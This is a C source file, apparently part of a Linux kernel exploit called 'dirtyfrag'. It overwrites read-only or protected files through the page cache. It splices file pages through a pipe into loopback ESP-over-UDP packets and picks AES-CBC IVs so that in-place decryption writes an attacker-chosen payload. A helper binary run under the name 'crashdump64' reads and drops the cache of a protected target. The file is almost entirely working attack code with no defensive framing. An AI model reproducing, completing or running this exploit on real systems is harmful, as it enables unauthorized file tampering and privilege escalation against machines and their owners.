#include "dirtyfrag_writer.h"

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#include "aes256.h"
#include "hmac_sha256.h"

void dirtyfrag_writer_init(struct DirtyFragWriter *writer,
                           int encap_port, int sender_port, uint32_t spi,
                           const uint8_t aes_key[32],
                           const uint8_t hmac_key[32], int icv_length) {
    memset(writer, 0, sizeof(*writer));
    writer->encap_port = encap_port;
    writer->sender_port = sender_port;
    writer->spi = spi;
    writer->icv_length = icv_length;
    writer->sequence = 1;
    memcpy(writer->aes_key, aes_key, sizeof(writer->aes_key));
    memcpy(writer->hmac_key, hmac_key, sizeof(writer->hmac_key));
}

void dirtyfrag_writer_set_paths(struct DirtyFragWriter *writer,
                                const char *bridge_path,
                                const char *protected_path) {
    writer->bridge_path = bridge_path;
    writer->protected_path = protected_path;
}

static void compute_iv(const struct DirtyFragWriter *writer,
                       const uint8_t old_content[16],
                       const uint8_t desired[16], uint8_t iv[16]) {
    uint8_t decrypted[16];
    aes256_ecb_decrypt(writer->aes_key, old_content, decrypted);
    for (int i = 0; i < 16; i++) iv[i] = decrypted[i] ^ desired[i];
}

int dirtyfrag_read_protected(struct DirtyFragWriter *writer, off_t offset,
                             uint8_t bytes[16], struct Reporter *reporter) {
    if (!writer->bridge_path || !writer->protected_path) return -1;
    int pipe_fds[2];
    if (pipe(pipe_fds) < 0) {
        REPORTLN("protected read pipe failed: %s", strerror(errno));
        return -1;
    }

    char offset_string[24];
    snprintf(offset_string, sizeof(offset_string), "%ld", (long)offset);
    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM,
                           0, 0, 0, 0);
    if (pid < 0) {
        REPORTLN("protected read vfork failed: %s", strerror(errno));
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        return -1;
    }
    if (pid == 0) {
        close(pipe_fds[0]);
        if (pipe_fds[1] != STDIN_FILENO) {
            if (dup2(pipe_fds[1], STDIN_FILENO) < 0) _exit(1);
            close(pipe_fds[1]);
        }
        execl(writer->bridge_path, "crashdump64", offset_string,
              writer->protected_path, "r", NULL);
        _exit(1);
    }

    close(pipe_fds[1]);
    int status;
    TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
    int count = 0;
    if (WIFEXITED(status) && WEXITSTATUS(status) == 0)
        count = (int)TEMP_FAILURE_RETRY(read(pipe_fds[0], bytes, 16));
    close(pipe_fds[0]);
    if (count == 16) return 0;
    if (WIFEXITED(status)) {
        static const char *const exit_meanings[] = {
            [0] = "success",
            [1] = "open/read failed or returned fewer than 16 bytes",
            [2] = "pipe write returned fewer than 16 bytes",
            [3] = "output fd is not a pipe after the domain transition",
        };
        int exit_code = WEXITSTATUS(status);
        const char *meaning = exit_code < 4
            ? exit_meanings[exit_code] : "unknown helper failure";
        REPORTLN("protected read at 0x%lx got %d bytes: %s (exit %d)",
                 (long)offset, count, meaning, exit_code);
    } else if (WIFSIGNALED(status))
        REPORTLN("protected read at 0x%lx got %d bytes: signal %d",
                 (long)offset, count, WTERMSIG(status));
    else
        REPORTLN("protected read at 0x%lx got %d bytes: status 0x%x",
                 (long)offset, count, status);
    return -1;
}

int dirtyfrag_drop_protected_cache(struct DirtyFragWriter *writer,
                                   struct Reporter *reporter) {
    if (!writer->bridge_path || !writer->protected_path) return -1;
    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM,
                           0, 0, 0, 0);
    if (pid < 0) {
        REPORTLN("protected cache drop vfork failed: %s", strerror(errno));
        return -1;
    }
    if (pid == 0) {
        execl(writer->bridge_path, "crashdump64", "0",
              writer->protected_path, "d", NULL);
        _exit(1);
    }
    int status;
    TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
        REPORTLN("protected cache drop failed status=0x%x", status);
        return -1;
    }
    REPORTLN("* protected target cache dropped: %s", writer->protected_path);
    return 0;
}

static int send_cbc_write(struct DirtyFragWriter *writer, int socket_fd,
                          int file_fd, off_t offset, const uint8_t iv[16],
                          const uint8_t old_content[16], int use_bridge,
                          struct Reporter *reporter) {
    int result = -1;
    int pipe_fds[2];
    if (pipe(pipe_fds) < 0) {
        REPORTLN("CBC pipe failed: %s", strerror(errno));
        return -1;
    }
    fcntl(pipe_fds[1], F_SETPIPE_SZ, 65536);

    uint32_t sequence = writer->sequence++;
    uint8_t header[24];
    *(uint32_t *)(header + 0) = htonl(writer->spi);
    *(uint32_t *)(header + 4) = htonl(sequence);
    memcpy(header + 8, iv, 16);

    uint8_t hmac_message[40];
    memcpy(hmac_message, header, 8);
    memcpy(hmac_message + 8, iv, 16);
    memcpy(hmac_message + 24, old_content, 16);
    uint8_t hmac[32];
    hmac_sha256(writer->hmac_key, 32, hmac_message, 40, hmac);

    struct iovec header_iov = {.iov_base = header, .iov_len = sizeof(header)};
    if (vmsplice(pipe_fds[1], &header_iov, 1, SPLICE_F_GIFT)
            != (ssize_t)sizeof(header)) {
        REPORTLN("CBC header vmsplice failed: %s", strerror(errno));
        goto done;
    }

    if (use_bridge) {
        char offset_string[24];
        snprintf(offset_string, sizeof(offset_string), "%ld", (long)offset);
        int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM,
                               0, 0, 0, 0);
        if (pid < 0) {
            REPORTLN("CBC bridge vfork failed: %s", strerror(errno));
            goto done;
        }
        if (pid == 0) {
            if (pipe_fds[1] != STDOUT_FILENO
                    && dup2(pipe_fds[1], STDOUT_FILENO) < 0) _exit(1);
            execl(writer->bridge_path, "crashdump64", offset_string,
                  writer->protected_path, NULL);
            _exit(1);
        }
        int status;
        TEMP_FAILURE_RETRY(waitpid(pid, &status, 0));
        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0) {
            REPORTLN("CBC bridge failed status=0x%x", status);
            goto done;
        }
    } else {
        off_t file_offset = offset;
        if (splice(file_fd, &file_offset, pipe_fds[1], NULL, 16,
                   SPLICE_F_MOVE) != 16) {
            REPORTLN("CBC file splice failed: %s", strerror(errno));
            goto done;
        }
    }

    struct iovec hmac_iov = {
        .iov_base = hmac,
        .iov_len = (size_t)writer->icv_length,
    };
    if (vmsplice(pipe_fds[1], &hmac_iov, 1, SPLICE_F_GIFT)
            != writer->icv_length) {
        REPORTLN("CBC ICV vmsplice failed: %s", strerror(errno));
        goto done;
    }

    int total = 24 + 16 + writer->icv_length;
    ssize_t sent = splice(pipe_fds[0], NULL, socket_fd, NULL,
                          (size_t)total, 0);
    result = sent == total ? 0 : -1;
    if (result != 0)
        REPORTLN("CBC pipe to UDP splice: %zd expected %d", sent, total);

done:
    close(pipe_fds[0]);
    close(pipe_fds[1]);
    return result;
}

int dirtyfrag_patch_file(struct DirtyFragWriter *writer, const char *path,
                         const void *payload, size_t length, size_t offset,
                         int use_bridge, struct Reporter *reporter) {
    if (length % 16 != 0 || writer->icv_length <= 0
            || writer->icv_length > 32) {
        REPORTLN("CBC patch rejected: length=%zu icv=%d",
                 length, writer->icv_length);
        return -1;
    }

    int socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (socket_fd < 0) {
        REPORTLN("CBC socket failed: %s", strerror(errno));
        return -1;
    }
    int reuse = 1;
    setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    struct sockaddr_in source = {
        .sin_family = AF_INET,
        .sin_port = htons((uint16_t)writer->sender_port),
        .sin_addr = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (bind(socket_fd, (struct sockaddr *)&source, sizeof(source)) < 0) {
        REPORTLN("CBC bind port %d failed: %s",
                 writer->sender_port, strerror(errno));
        close(socket_fd);
        return -1;
    }
    struct sockaddr_in destination = {
        .sin_family = AF_INET,
        .sin_port = htons((uint16_t)writer->encap_port),
        .sin_addr = {.s_addr = htonl(INADDR_LOOPBACK)},
    };
    if (connect(socket_fd, (struct sockaddr *)&destination,
                sizeof(destination)) < 0) {
        REPORTLN("CBC connect failed: %s", strerror(errno));
        close(socket_fd);
        return -1;
    }

    int file_fd = -1;
    if (!use_bridge) {
        file_fd = open(path, O_RDONLY | O_CLOEXEC);
        if (file_fd < 0) {
            REPORTLN("CBC open %s failed: %s", path, strerror(errno));
            close(socket_fd);
            return -1;
        }
    }

    int result = 0;
    const uint8_t *desired_bytes = payload;
    for (size_t block = 0; block < length / 16; block++) {
        off_t block_offset = (off_t)(offset + block * 16);
        uint8_t old_content[16] = {0};
        int read_result = use_bridge
            ? dirtyfrag_read_protected(writer, block_offset, old_content, reporter)
            : (pread(file_fd, old_content, 16, block_offset) == 16 ? 0 : -1);
        if (read_result != 0) {
            REPORTLN("CBC read at 0x%lx failed: %s",
                     (long)block_offset, strerror(errno));
            result = -1;
            break;
        }

        uint8_t iv[16];
        compute_iv(writer, old_content, desired_bytes + block * 16, iv);
        if (send_cbc_write(writer, socket_fd, file_fd, block_offset, iv,
                           old_content, use_bridge, reporter) != 0) {
            REPORTLN("CBC write block %zu at 0x%lx failed",
                     block, (long)block_offset);
            result = -1;
            break;
        }
        if (block % 32 == 0) REPORTLN("%zu ...", block * 16);
    }

    if (file_fd >= 0) close(file_fd);
    close(socket_fd);
    if (result == 0)
        REPORTLN("patched %zu bytes to %s+0x%zx", length, path, offset);
    return result;
}
